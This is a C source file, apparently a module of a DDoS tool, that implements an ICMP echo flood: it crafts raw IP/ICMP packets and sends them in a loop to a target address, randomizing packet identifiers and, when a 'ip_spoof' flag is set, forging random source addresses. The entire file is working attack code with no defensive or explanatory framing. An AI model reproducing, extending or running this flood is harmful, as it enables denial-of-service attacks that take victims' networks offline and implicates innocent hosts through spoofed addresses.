#include "common.h"

struct icmp_payload {
    struct ip ip;
    struct icmp icmp;
};


void icmp_cksum(struct icmp *icmp, ushort size)
{
    icmp->icmp_cksum = 0;
    icmp->icmp_cksum = in_cksum((u_short *) icmp, size);
}

ushort make_ping_request(struct icmp *icmp, u_int16_t id, u_int16_t seq)
{
    ushort icmp_size = 8;
    *icmp = (struct icmp) {
        .icmp_type = ICMP_ECHO,
        .icmp_code = 0,
        .icmp_cksum = 0,
        .icmp_id = htons(id),
        .icmp_seq = htons(seq),
    };
    icmp_cksum(icmp, icmp_size);
    return icmp_size;
}

void icmp_flood(struct in_addr src, struct in_addr dst, struct ddos_flags flags, unsigned long long maxcount)
{
    int fd = ip_rawsocket();
    
    struct icmp_payload payload;
    
    struct sockaddr_in sockdst;
    ip_mksaddr(&sockdst, dst);
    ip_init(&payload.ip, IPPROTO_ICMP);
    ip_setsrc(&payload.ip, src);
    ip_setdst(&payload.ip, dst);
    
    
    
    struct counter cnt;
    counter_reset(&cnt, "packets");
    
    while (counter_less(&cnt, maxcount)) {
        if (flags.ip_spoof) payload.ip.ip_src.s_addr = rand_u32();
        
        ip_setid(&payload.ip, rand_u16());
        ushort icmp_size = make_ping_request(&payload.icmp, rand_u16(), rand_u16());
        ip_resize(&payload.ip, icmp_size);
        ip_cksum(&payload.ip);

        int r = sendto(fd, &payload, ip_size(&payload.ip), 0, (struct sockaddr *) &sockdst, sizeof(sockdst));
        assert(r > 0);
        
        if (counter_less(&cnt, 1)) dump(&payload, ip_size(&payload.ip));
        counter_inc(&cnt);
    }
    
    close(fd);
}
